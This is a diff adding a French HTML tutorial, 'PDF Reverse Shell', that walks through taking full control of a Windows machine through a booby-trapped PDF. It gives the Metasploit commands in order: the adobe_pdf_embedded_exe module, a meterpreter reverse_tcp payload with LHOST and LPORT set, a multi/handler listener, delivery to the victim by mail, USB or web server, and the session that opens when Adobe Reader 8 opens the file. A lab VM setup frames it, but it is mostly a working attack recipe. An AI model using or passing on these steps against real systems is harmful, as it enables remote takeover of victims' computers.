@@ -1,0 +1,170 @@
+<h1><b>PDF Reverse Shell</b></h1>
+
+
+<h2>1. Objectif</h2>
+
+<p>
+    L’Objectif ici est de prendre le contrôle total sur une machine windows qui aura ouvert un fichier pdf qu'un
+    attaquant lui aura envoyé.
+</p>
+
+<h2>2. Configuration</h2>
+
+<p>
+    Pour ce tutoriel nous utiliserons docker pour avoir une machine attaquante (ayant msfconsole installé)
+    <br>
+    Télécharger le fichier <a class="link-primary"
+        href="../Docker/Tuto_Reverse_Shell/docker-compose.yml"><U>docker-compose.yml</U></a>
+    <br>
+    Tapez les commandes suivantes :
+</p>
+
+<p class="code">docker-compose up -d</p>
+
+<p>
+    Pour utiliser Metasploit tapez la commande :
+</p>
+
+<p class="code">docker run -it chasepd/msfconsole</p>
+
+<p>
+    Il vous faudra aussi télécharger une image de machine windows qui servira de machine victime.
+    <br>
+    Téléchargez l'image ici : <a class="link-primary"
+        href="https://mega.nz/file/YbEHwDJa#ky-4v_EFZCSYkLJLwulOvQXYNAbfivyp73gFinxZoDk"><U>image windows</U></a>
+    <br>
+    Vous pourrez importe l'image et la lancer dans virtualbox.
+</p>
+
+<h2>3. Lancer l’attaque</h2>
+
+<p>
+    Métasploit propose un grand nombre de payloads divers et variés. En tapant les bonnes recherches, il sera
+    possible de trouver facilement celui qui
+    nous intéresse. Il faut chercher le payload.
+    <br>
+    Tapez :
+</p>
+
+<p class="code">search windows fileformat pdf</p>
+
+<p>
+    Vous aurez un résultat comme ci dessous :
+</p>
+
+<img src="images/search_msfconsole.png" alt="">
+
+<p>
+    Plusieurs modules répondent à notre recherche, mais peu d’entre eux sont classés comme excellents. Nous allons
+    donc prendre le numéro 6.
+    Pour l’utiliser tapez :
+</p>
+
+<p class="code">use exploit/windows/fileformat/adobe_pdf_embedded_exe</p>
+
+<p>
+    Nous allons vouloir configurer un payload qui nous fera une connexion
+    vers notre machine et qui ouvrira une session meterpreter. Ainsi, tapons la commande :
+</p>
+
+<p class="code">set payload windows/meterpreter/reverse_tcp</p>
+
+<p>
+    Pour voir les options actuelles du payload, tapez :
+</p>
+
+<p class="code">show options</p>
+
+<img src="images/show_options.png" alt="">
+
+<p>
+    Vous devriez avoir quelque chose comme cela, peut être qu’une adresse par défaut ou qu’un port par défaut à
+    été renseigné pour LHOST et LPORT.
+    Nous allons configurer ce payload. Il faut commencer par renseigner les valeurs de LHOST et LPORT. Pour cela
+    tapez </p>
+
+<p class="code">set LHOST x.x.x.x</p>
+
+<p>en remplaçant
+    les x par les valeurs de l’adresse ip de votre machine. Puis tapez </p>
+
+<p class="code">set LPORT xxx</p>
+
+<p> en remplaçant xxx par le port de votre choix (par exemple, </p>
+
+<p class="code">set LPORT 4444</p>
+
+<p>
+    ). vous pouvez refaire un show options, vous devriez voir que les options ont été prises en compte. Vous
+    pouvez ensuite modifier le nom de votre
+    fichier pdf en tapant </p>
+
+<p class="code">set FILENAME xxxx.pdf</p>
+
+<p>en remplaçant xxxx par le nom que vous voulez donner.
+    Quand tout est prêt, tapez
+</p>
+
+<p class="code">exploit</p>
+
+<p>
+    Vous verrez ensuite que votre fichier a été créé et la
+    console vous indique à la dernière ligne le chemin d’accès à ce fichier.
+    <br>
+    <br>
+    Maintenant il faut activer le listener. Pour activer le listener, il vous faudra taper la commande
+</p>
+
+<p class="code">
+    use exploit/multi/handler</p>
+
+<p>puis</p>
+
+<p class="code">set payload windows/meterpreter/reverse_tcp</p> 
+
+<p>De même que précédemment, il vous faut
+renseigner LHOST et LPORT. Quand cela est fait, tapez </p>
+<p class="code">exploit</p>.
+
+<p>
+Maintenant, il vous faut envoyer le pdf à la machine victime.
+Vous pouvez envoyer le fichier de toutes les manières possibles : par usb, par mail, en le mettant en ligne en
+ayant démarré un serveur apache,... et tout autre technique imaginable.
+<br>
+<br>
+Le fichier est bien téléchargé sur la machine virtuelle. Avant de l’ouvrir, vérifiez bien que le listener est
+lancé. Vous devez voir cela :
+</p>
+
+<img src="images/listener.png" alt="">
+
+<p>
+avec votre adresse et votre port que vous avez renseigné.
+<br>
+<br>
+Si tout est prêt, ouvrez le pdf avec adobe reader 8 !
+</p>
+
+<img src="images/enregistrer-template.png" alt="">
+
+<p>
+Enregistrez template.pdf s’il vous le demande.
+</p>
+
+<img src="images/openpdf.png" alt="">
+
+<p>
+Cliquez sur open.
+<br>
+<br>
+Retournez voir votre listener… Une fenêtre meterpreter s’est lancée, une connexion a été faite entre votre
+machine et celle de la victime.
+Tapez 
+</p>
+<p class="code">help</p> 
+<p>
+    pour voir tout ce qu’il vous est possible de faire. Amusez-vous bien !
+Félicitations !
+
+
+</p>
